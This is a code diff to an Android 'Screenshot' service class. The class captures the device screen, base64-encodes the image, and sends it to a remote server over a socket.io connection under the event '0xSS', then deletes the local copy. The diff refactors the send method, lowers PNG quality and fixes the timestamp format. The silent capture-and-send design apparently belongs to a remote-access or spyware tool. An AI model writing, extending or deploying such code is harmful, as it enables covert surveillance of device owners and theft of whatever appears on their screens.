@@ -131,7 +131,7 @@ public class Screenshot extends Service {
                     public void onPostExecute(Bitmap bitmap) {
                         super.onPostExecute(bitmap);
                         Log.d("TAGG", new StringBuffer().append("Got bitmap?").append(bitmap != null).toString());
-                        send(filePath);
+                        send("0xSS", filePath);
                         if (mVirtualDisplay != null) {
                             mVirtualDisplay.release();
                         }
@@ -160,7 +160,7 @@ public class Screenshot extends Service {
         return true;
     }
 
-    private boolean send(File file) {
+    public static boolean send(String str, File file) {
         if (file == null) {
             Log.d("TAGG", "send() file null");
         }
@@ -172,7 +172,7 @@ public class Screenshot extends Service {
             Log.d("TAGG", "bitmap " + file.getAbsolutePath());
             if (decodeFile != null) {
                 ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
-                decodeFile.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);
+                decodeFile.compress(Bitmap.CompressFormat.PNG, 80, byteArrayOutputStream);
                 String encodeToString = Base64.encodeToString(byteArrayOutputStream.toByteArray(), 0);
                 JSONObject jSONObject = new JSONObject();
                 jSONObject.put("image", true);
@@ -181,7 +181,7 @@ public class Screenshot extends Service {
                 Socket ioSocket = IOSocket.getInstance().getIoSocket();
                 Object[] objArr = new Object[1];
                 objArr[0] = jSONObject;
-                ioSocket.emit("0xSS", objArr);
+                ioSocket.emit(str, objArr);
                 file.delete();
             }
         } catch (JSONException e) {
@@ -193,7 +193,7 @@ public class Screenshot extends Service {
     public static File getFilePath() {
         File file = null;
         String mSamplePath = null;
-        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy_mm_dd_hh_mm", Locale.getDefault());
+        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault());
         if (Environment.getExternalStorageState().equals("mounted")) {
 //            mSamplePath = Environment.getExternalStoragePublicDirectory(File.separator).getAbsolutePath();
             mSamplePath = MainService.getContextOfApplication().getExternalCacheDir().getPath();
